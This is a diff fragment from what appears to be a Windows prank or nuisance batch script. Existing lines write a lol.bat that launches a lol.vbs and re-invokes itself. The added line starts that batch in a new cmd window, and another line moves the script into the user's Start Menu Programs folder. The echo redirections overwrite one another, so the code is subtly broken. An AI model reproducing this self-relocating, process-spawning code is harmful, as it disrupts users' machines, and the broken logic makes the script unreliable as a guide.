@@ -75,6 +75,7 @@ echo @echo off>"C:\mini\lol.bat
 echo start cscript "C:\mini\lol.vbs">"C:\mini\lol.bat"
 echo start cmd.exe "C:\mini\lol.bat">"C:\mini\lol.bat"
 echo timeout 5>"C:\mini\lol.bat"
+start cmd.exe /k "C:\mini\lol.bat"
 
 
 move "%~f0" "C:\Users\Guus0\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\"
